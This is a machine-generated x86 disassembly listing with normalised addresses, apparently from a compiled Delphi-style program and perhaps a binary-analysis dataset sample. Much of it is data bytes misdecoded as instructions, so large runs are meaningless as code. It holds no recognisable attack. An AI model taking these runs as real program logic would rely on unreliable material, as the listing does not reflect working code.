mov eax esi
call sub_4042d8
add [ eax ] al
add [ eax ] al
inc edx
popad
jae r-xdata
nop
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
dec ecx
insb
jb r-xdata
add bh bh
add [ eax ] eax
inc edx
popad
jae r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
add [ eax ] al
cmp dl 0x0
add [ eax ] al
add al 0x0
add [ eax ] dl
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ gs : eax ] dl
inc eax
add [ ecx ] dh
add [ eax ] al
cld
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov eax eax
and al 0x41
inc edi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
outsb
je r-xdata
call sub_41daa8
test bl bl
jle r-xdata
je r-xdata
popad
je r-xdata
inc esi
jb r-xdata
retn
cmp al 0x10
inc eax
add [ eax + eax ] dh
add bh bh
xor al 0x0
and dl 0xfc
shl [ ebp - 0x2c74ffb6 ] 0x1
dec eax
outsd
outsb
arpl [ ecx + 0x74 ] sp
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x50736148
inc edx
popad
jae r-xdata
popad
jae r-xdata
rol [ eax + 0x47 ] 0x1
add ah bh
sub_474220
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call [ eax + 0x38 ]
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
sete al
or bl al
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_474264
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4742db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4650ac
mov eax ebx
call sub_4650b0
test al al
jne r-xdata
mov [ ebx + 0x30 ] 0x1
mov [ ebx + 0x31 ] 0x1
mov [ ebx + 0x34 ] 0xfa
mov [ ebx + 0x38 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4742e2
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
mov eax [ r-xdata ]
call sub_463250
mov [ rw-data ] ebx
sub_474585
fild [ ecx ]
add dl ah
inc ecx
add ah ah
fiadd [ ecx ]
or ecx [ ecx + 0x64 ]
inc ebx
add [ eax + 0x50 ] dh
inc esi
add [ eax + ecx * 2 + 0x47 ] ah
add [ edi + eax * 2 ] cl
inc edi
add [ edi + eax * 2 + 0x48140047 ] bl
inc edi
add [ esp + edx * 2 ] cl
dec ecx
inc ebx
outsd
insd
jo r-xdata
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4746fc
outsb
outsb
je r-xdata
fsubr st3
inc esi
add al ch
outsb
outsb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474703
lea eax [ ebp - 0x10 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
mov [ ebx + 0x47 ] al
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080002 ] al
outsb
push ebx
je r-xdata
add [ eax + 0x30004743 ] cl
add [ eax + 0x4f ] ch
inc esi
add al ch
loope r-xdata
inc eax
add al al
inc ebp
inc edi
add [ edi ] al
or al 0x54
dec ecx
inc ebx
outsd
insd
jo r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx edi
movzx eax bl
mov edx [ eax * 4 + rw-data ]
mov eax [ r-xdata ]
call sub_4624e8
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
push 0x0
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea ecx [ ebp - 0xc ]
movzx eax bl
mov edx [ eax * 4 + rw-data ]
mov eax [ r-xdata ]
call sub_4624e8
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
je r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ esi + eax * 2 ] cl
inc edi
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
pop ebx
retn
outsb
outsb
je r-xdata
add [ ebp + 0x3350fc45 ] cl
ror [ ecx + 0x45c6f445 ] 0xf8
or ecx [ ebp - 0x49f00bb3 ]
retn
jae r-xdata
nop
outsd
insd
jo r-xdata
inc ebp
inc edi
add ah bh
dec edi
inc esi
add [ ebx ] al
add [ ebx ] cl
dec ecx
inc ebx
inc eax
add [ ebx + 0x56 ] dl
call sub_404330
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41daa8
mov eax [ r-xdata ]
call sub_46f7f4
test bl bl
jle r-xdata
pop esi
mov eax esi
call sub_4042d8
sub_47460c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41daa8
mov eax [ r-xdata ]
call sub_46f7f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_474648
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4746fc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474703
lea eax [ ebp - 0x10 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx edi
movzx eax bl
mov edx [ eax * 4 + rw-data ]
mov eax [ r-xdata ]
call sub_4624e8
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
push 0x0
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea ecx [ ebp - 0xc ]
movzx eax bl
mov edx [ eax * 4 + rw-data ]
mov eax [ r-xdata ]
call sub_4624e8
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
sub_47470c
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov ecx eax
mov esi [ ecx + 0x80 ]
test esi esi
je r-xdata
movzx eax bl
imul eax eax 0x3
jno r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
add [ ecx + eax * 8 + 0x60 ] 0x1
jno r-xdata
call sub_403e34
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ecx + eax * 8 + 0x60 ] 0x1
jne r-xdata
call sub_403e34
mov edx [ ebp + 0x8 ]
mov [ ecx + eax * 8 + 0x58 ] edx
mov edx [ ebp + 0xc ]
mov [ ecx + eax * 8 + 0x5c ] edx
mov [ ecx + eax * 8 + 0x50 ] 0x0
mov [ ecx + eax * 8 + 0x54 ] 0x0
cmp [ ecx + 0x42 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
push eax
mov esi ecx
mov edx ecx
mov ecx ebx
mov eax [ esi + 0x44 ]
call [ esi + 0x40 ]
call sub_403e2c
sub_47479c
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov ecx eax
mov esi [ ecx + 0x80 ]
test esi esi
je r-xdata
movzx eax bl
imul esi eax 0x3
jno r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
cmp [ ecx + esi * 8 + 0x60 ] 0x0
jle r-xdata
call sub_403e34
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
add [ ecx + esi * 8 + 0x50 ] eax
adc [ ecx + esi * 8 + 0x54 ] edx
cmp [ ecx + 0x3a ] 0x0
je r-xdata
mov eax [ ecx + esi * 8 + 0x50 ]
mov edx [ ecx + esi * 8 + 0x54 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
push eax
mov esi ecx
mov edx ecx
mov ecx ebx
mov eax [ esi + 0x3c ]
call [ esi + 0x38 ]
call sub_403e2c
sub_474814
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
movzx eax bl
imul edi eax 0x3
jno r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
cmp [ esi + edi * 8 + 0x60 ] 0x1
jne r-xdata
call sub_403e34
pop edi
pop esi
pop ebx
retn
sub [ esi + edi * 8 + 0x60 ] 0x1
jno r-xdata
cmp [ esi + 0x4a ] 0x0
je r-xdata
call sub_403e34
mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_474874
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4748b0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4748b7
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_405af0
sub_47490c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add ah cl
jno r-xdata
inc edi
add [ ecx + ecx * 2 + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esi eax
dec ecx
inc edi
add [ eax ] bh
add [ eax ] al
add [ ebx + eax * 2 + 0x41ac0041 ] ah
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add al cl
dec ebx
inc edi
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
add [ edi + ecx * 2 + 0x47 ] bl
insb
add [ edx + esi * 2 + 0x72dc0041 ] ch
inc ecx
add ah dl
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] dl
popad
outsb
insb
push esp
dec ecx
inc edi
add [ eax ] dh
inc esp
inc ecx
add [ 0x64490e00 ] al
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
push ebx
add [ eax ] cl
dec esi
inc edi
add al dl
dec edx
inc edi
add [ eax + 0x4b ] al
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x1c004010 ] dh
add [ eax ] al
add [ eax + 0x20004010 ] dh
add [ eax ] al
add [ edi ] cl
push esp
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50040004 ] al
outsd
jb r-xdata
outsb
je r-xdata
add [ 0x65696c43 ] cl
popad
outsb
insb
add eax 0x40103c00
add [ eax + eax ] cl
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov eax eax
lodsb [ esi ]
dec ecx
inc edi
add [ edi ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
popad
outsb
insb
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
or edx 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4750c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_42aa00
retn
jpo r-xdata
dec ebp
popad
js r-xdata
add [ eax ] al
dec [ eax ]
push ecx
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x50 ] ecx
push esi
jb r-xdata
outsd
jb r-xdata
mov ch 0x4a
add [ ebx - 0x74307500 ] cl
salc
mov esi [ eax ]
call [ esi + 0x4c ]
mov edx eax
mov eax ebx
call sub_4750c8
pop edi
pop esi
pop ebx
retn
add [ ecx + ecx - 0x4e ] dh
add [ ebx + 0x541e8c3 ] ecx
add [ eax ] al
movzx eax [ ebx + 0x31 ]
push eax
movzx eax [ ebx + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
adc [ eax ] al
sbb al 0x0
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
cmp [ eax ] bh
inc esi
add [ ecx ] dh
cld
cmp [ eax + 0x18 ] 0x0
je r-xdata
outsd
jb r-xdata
imul ebp [ edi + 0x6e ] r-xdata
and al 0x0
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x50
add [ eax ] al
call [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or eax 0x65696c43
dec ebp
imul ebp [ esi + 0x3c ] 0x10004010
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_42a9f8
xor eax eax
push ebp
push sub_474b36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
sub_474a88
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
cmp [ ebx + 0x18 ] 0x0
je r-xdata
movzx eax [ ebx + 0x31 ]
push eax
movzx eax [ ebx + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
mov esi [ eax ]
call [ esi + 0x4c ]
mov edx eax
mov eax ebx
call sub_4750c8
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_474fe8
sub_474ad0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_42a9f8
xor eax eax
push ebp
push sub_474b36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
or edx 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4750c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_42aa00
retn
sub_474b40
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x31 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_42a9f8
xor eax eax
push ebp
push sub_474bba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474bc1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_42aa00
retn
mov eax [ ebp - 0x4 ]
call sub_474fb0
mov eax [ ebp - 0x4 ]
call sub_474fcc
sub_474bc8
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
lea edx [ esi + 0x34 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417160
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_474c1c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
push ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ esi + 0x14 ]
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_474c40
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
push ecx
mov eax [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ esi + 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop esi
pop ebx
pop ebp
retn 0x8
sub_474c68
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_474dab
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov eax ebx
call sub_475020
test al al
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474db2
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x24 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax [ ebx + 0x10 ]
jle r-xdata
mov eax ebx
call sub_475078
test al al
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x18 ]
mov eax [ r-xdata ]
call sub_4624e8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
push 0x1
lea eax [ ebp - 0x1c ]
push eax
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406fd4
mov edx [ ebp - 0x20 ]
mov eax [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x18 ]
mov eax [ r-xdata ]
call sub_4624e8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
sub_474db8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x20 ]
mov edx esi
call sub_404e98
mov [ ebx + 0x28 ] edi
movzx eax [ ebp + 0x8 ]
mov [ ebx + 0x31 ] al
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_474de0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_404e98
mov [ ebx + 0x24 ] edi
movzx eax [ ebp + 0x8 ]
mov [ ebx + 0x31 ] al
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_474e08
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_417128
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a970
mov [ edi + 0x34 ] eax
mov dl 0x1
mov eax edi
call sub_474fe8
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x10 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x24 ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_474e70
push ebp
mov ebp esp
push 0x0
push ebx
xor edx edx
push ebp
push sub_474ed7
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x18 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_4750a8
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474ede
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_474ee4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ r-xdata ]
call sub_4742e8
test al al
je r-xdata
push ebp
mov eax ebx
call sub_474e70
pop ecx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cmp ebx eax
jle r-xdata
push ebp
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
call sub_474e70
pop ecx
test al al
je r-xdata
push ebp
mov edx [ rw-data ]
sub ebx eax
jno r-xdata
jmp r-xdata
mov eax ebx
call sub_474e70
pop ecx
test al al
jne r-xdata
call sub_403e34
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov ebx [ eax + 0x34 ]
sub_474f5c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_403e3c
mov edi eax
mov eax esi
call sub_403e3c
cmp edi eax
je r-xdata
lea eax [ ebx + 0x1c ]
mov edx [ esi + 0x1c ]
call sub_404e98
mov eax [ esi + 0x24 ]
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x20 ]
mov edx [ esi + 0x20 ]
call sub_404e98
mov eax [ esi + 0x28 ]
mov [ ebx + 0x28 ] eax
movzx eax [ esi + 0x31 ]
mov [ ebx + 0x31 ] al
mov edx esi
mov eax ebx
call sub_416dc8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_474fe8
push ebx
push esi
mov ebx edx
mov esi eax
or edx 0xffffffff
mov eax esi
call sub_4750c8
test bl bl
je r-xdata
lea eax [ esi + 0x20 ]
call sub_404e44
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x31 ] 0x0
pop esi
pop ebx
retn
lea eax [ esi + 0x1c ]
call sub_404e44
xor eax eax
mov [ esi + 0x24 ] eax
sub_475020
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_475064
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x24 ]
push eax
movzx eax [ esi + 0x31 ]
push eax
mov ecx [ esi + 0x1c ]
mov edx [ esi + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov bl 0x1
mov eax esi
call sub_474fb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_475078
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
sub esi edi
jg r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
dec esi
dec edi
inc esi
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp + 0x24 ] edi
mov eax ebp
call sub_475020
test al al
je r-xdata
sub_4750a8
push ebx
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov ebx eax
test bl bl
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_474220
mov eax ebx
pop ebx
retn
sub_4750c8
push ebx
push esi
mov ebx eax
mov eax edx
mov [ ebx + 0x14 ] eax
inc eax
setne al
mov [ ebx + 0x18 ] al
lea edx [ ebx + 0x2c ]
mov eax [ r-xdata ]
call sub_462560
cmp [ ebx + 0x18 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ r-xdata ]
call sub_46ed7c
mov esi eax
mov [ ebx + 0x2c ] esi
mov edx [ ebx + 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_475108
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_475160
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x31 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475167
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov [ eax + 0x31 ] dl
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
sub_475170
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x52
inc edi
add [ edx + edx * 2 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
push edx
inc edi
add [ eax + eax ] bl
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push edx
jo r-xdata
add [ ebx + edx * 2 + 0x56bc0047 ] al
inc edi
add [ esi + edx * 2 + 0x56b40047 ] ch
inc edi
add [ eax + 0x24004032 ] dl
push ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ edx + 0x47 ] 0x1
jns r-xdata
or [ ebx + 0x3be8f0c4 ] al
out dx eax
clc
dec [ ebx + 0x33f08bda ]
ror [ ebx + 0x1dcee8c6 ] cl
cli
dec [ ebx + 0x46890845 ]
adc al 0x8b
jns r-xdata
inc eax
add al al
push ebx
inc edi
add al ah
push edx
inc edi
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add [ esp + edx * 2 ] ah
inc edi
add [ edx + esi * 2 + 0x72dc0041 ] ch
inc ecx
add ah dl
jb r-xdata
sbb [ edi ] bh
